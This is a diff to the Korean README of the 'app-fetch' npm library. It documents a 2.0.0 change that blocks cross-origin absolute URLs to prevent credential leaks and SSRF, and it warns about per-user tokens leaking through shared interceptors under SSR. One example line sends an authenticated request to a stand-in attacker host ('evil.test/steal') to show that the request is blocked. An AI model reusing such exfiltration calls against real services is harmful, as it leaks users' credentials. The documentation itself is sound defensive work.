@@ -12,6 +12,8 @@
 - **GitHub**: [github.com/jaeryeol2/app-fetch](https://github.com/jaeryeol2/app-fetch)
 - **npm**: [npmjs.com/package/app-fetch](https://www.npmjs.com/package/app-fetch)
 
+> ⚠️ **2.0.0 변경 사항 (Breaking)**: `baseURL`이 설정된 요청에서 **origin이 다른 `http(s)` 절대 URL은 기본적으로 차단**됩니다. 인스턴스로 외부 API를 직접 호출하던 코드는 해당 호출에 `allowAbsoluteUrls: true`를 지정하세요. (아래 `7. 내부 안전 가드` 4번 참고)
+
 ---
 
 ## 📌 주요 특징 (Key Features)
@@ -280,6 +282,16 @@ const reader = stream.body?.getReader();
 실무 프로젝트마다 백엔드 API의 응답 구조(Response Envelope - 예: `{ status, message, data }` 또는 `{ code, result, isSuccess }`)가 다를 수 있습니다.  
 `app-fetch`는 특정 프로젝트 스키마에 종속되지 않도록 설계되어 있으며, 프로젝트 환경에 맞춰 아래와 같이 전역 응답 타입(`ResponseApi<T>`) 및 커스텀 래퍼 클라이언트를 손쉽게 구성할 수 있습니다. (`examples/sample.ts` 참고)
 
+> ⚠️ **SSR/서버 환경 주의 — 전역 인터셉터에 사용자별 값을 넣지 마세요.** 아래 `globalInterceptors`는 모듈 전역에서 공유되는 객체입니다. Next.js/Nuxt SSR이나 NestJS처럼 한 프로세스가 여러 사용자의 요청을 동시에 처리하는 환경에서 요청마다 `setInterceptors`로 사용자 토큰을 주입하면, **동시에 처리 중인 다른 사용자의 요청에 그 토큰이 섞여 전송**될 수 있습니다. 전역 인터셉터에는 로깅처럼 사용자와 무관한 로직만 두고, 사용자별 토큰은 호출할 때 `headers` 또는 요청별 `beforeRequest`로 전달하세요.
+>
+> ```typescript
+> // ❌ SSR에서 위험: 요청마다 전역 레지스트리를 덮어씀
+> setInterceptors(globalInterceptors, { beforeRequest: (o) => (o.headers as Headers).set('Authorization', `Bearer ${userToken}`) });
+>
+> // ✅ 요청 단위로 전달
+> await sampleFetch('/me', { headers: { Authorization: `Bearer ${userToken}` } });
+> ```
+
 ```typescript
 import { appFetch, getData, HttpError, returnError, mergeFetchOptions } from 'app-fetch';
 import type { FetchInterceptors, AppFetchOptions } from 'app-fetch';
@@ -381,6 +393,17 @@ export const sampleFetch = Object.assign(wrap, { native });
    - 비동기 인터셉터(토큰 갱신 등) 실행 도중 타임아웃(`options.timeout`)이 초과되면 `Promise.race`를 통해 `AbortSignal` 이벤트를 감지하여 즉시 요청을 중단하고 `AbortError`를 발생시킵니다.
 3. **`response.clone()` 스트림 잠김 방지**:
    - `afterResponse` 인터셉터에는 `response.clone()`이 전달되므로, 인터셉터에서 본문을 읽어도 이후 `getData()` 파싱에 영향을 주지 않습니다. `getData()` 자체는 원본 스트림을 한 번만 소비하고 결과를 캐시합니다.
+4. **절대 URL의 `baseURL` 우회 차단 (자격증명 유출/SSRF 방지)**:
+   - `baseURL`이 설정된 경우, **origin이 다른 `http(s)` 절대 URL은 요청 전에 에러로 차단**됩니다. 사용자 입력으로 조립된 경로(`client(req.query.path)` 등)가 인스턴스의 인증 헤더를 실은 채 외부 호스트로 나가는 것을 막습니다. 에러 메시지에는 전체 URL 대신 origin만 포함되어 쿼리의 토큰이 로그에 남지 않습니다.
+   - `baseURL`과 **같은 origin**의 절대 URL(예: 페이지네이션 `next` 링크), 네트워크로 나가지 않는 `blob:`/`data:` URL, `baseURL`이 없는 호출은 그대로 허용됩니다.
+   - 외부 API를 의도적으로 호출해야 한다면 호출 또는 인스턴스에 `allowAbsoluteUrls: true`를 지정하세요. 이때 인스턴스 기본 헤더(토큰 포함)도 함께 전송되므로, 외부 호출용 인스턴스는 인증 헤더 없이 따로 만드는 것을 권장합니다.
+
+   ```typescript
+   const api = appFetch.create({ baseURL: 'https://api.example.com', headers: { Authorization: 'Bearer ...' } });
+   await api('https://evil.test/steal');                                  // ❌ Error: Absolute URL origin "https://evil.test" does not match baseURL
+   await api('https://api.example.com/v1/items?page=2');                   // ✅ 같은 origin
+   await api('https://partner.test/data', { allowAbsoluteUrls: true });    // ✅ 명시적 허용
+   ```
 
 ---
 
@@ -404,11 +427,12 @@ export const sampleFetch = Object.assign(wrap, { native });
 
 - **본문이 허용되지 않는 메서드는 `GET`/`HEAD`뿐입니다.** RFC 9110에 따라 `DELETE`는 본문을 가질 수 있으므로(대량 삭제 API 등) `POST`와 동일하게 직렬화됩니다. `GET`/`HEAD`에 전달된 `body`는 네이티브 `fetch`의 `TypeError`를 막기 위해 조용히 제거됩니다.
 - **`body`가 `FormData`이면 `Content-Type` 헤더가 자동으로 제거됩니다.** 멀티파트 `boundary`는 런타임이 직접 생성해야 하므로, 인스턴스 기본 헤더 등에 `application/json`이 설정되어 있어도 업로드가 깨지지 않습니다. `URLSearchParams`/`Blob` 본문도 JSON 계열 `Content-Type`이 남아 있으면 제거되어, 런타임이 `application/x-www-form-urlencoded` 또는 `Blob.type`으로 채웁니다.
-- **스킴이 명시된 절대 URL(`https:`, `blob:`, `data:` 등)은 `baseURL`과 결합하지 않고 그대로 사용됩니다.** 반대로 `//`로 시작하는 경로는 `baseURL`이 설정된 경우 그 하위 상대 경로로 정규화되어, 사용자 입력으로 조립된 경로가 인증 헤더를 실은 채 외부 호스트로 나가는 것을 방지합니다.
+- **스킴이 명시된 절대 URL(`https:`, `blob:`, `data:` 등)은 `baseURL`과 결합하지 않고 그대로 사용됩니다.** 단, `baseURL`과 origin이 다른 `http(s)` URL은 `allowAbsoluteUrls: true` 없이는 차단됩니다. 반대로 `//`로 시작하는 경로는 `baseURL`이 설정된 경우 그 하위 상대 경로로 정규화되어, 사용자 입력으로 조립된 경로가 인증 헤더를 실은 채 외부 호스트로 나가는 것을 방지합니다.
 
 | 옵션명 | 타입 | 기본값 | 설명 |
 | :--- | :--- | :---: | :--- |
 | `baseURL` | `string` | `undefined` | 모든 상대 경로에 결합될 기본 URL |
+| `allowAbsoluteUrls` | `boolean` | `false` | `baseURL`이 있을 때 origin이 다른 `http(s)` 절대 URL 요청을 허용 (기본은 차단) |
 | `method` | `'get' \| 'delete' \| 'head' \| 'options' \| 'post' \| 'put' \| 'patch'` | `'get'` | HTTP 메서드. 소문자로 지정하며 전송 시 내부에서 대문자로 변환됩니다 |
 | `query` | `Record<string, unknown> \| object` | `undefined` | 모든 HTTP 요청 시 URL 쿼리 스트링으로 직렬화할 파라미터 객체 (중첩 객체/배열/Map/Set/Date 지원) |
 | `body` | `Record<string, unknown> \| BodyInit` | `undefined` | POST / PUT / PATCH / DELETE 요청 시 전송할 바디 (Object는 자동 JSON 직렬화, GET / HEAD에서는 제거됨) |
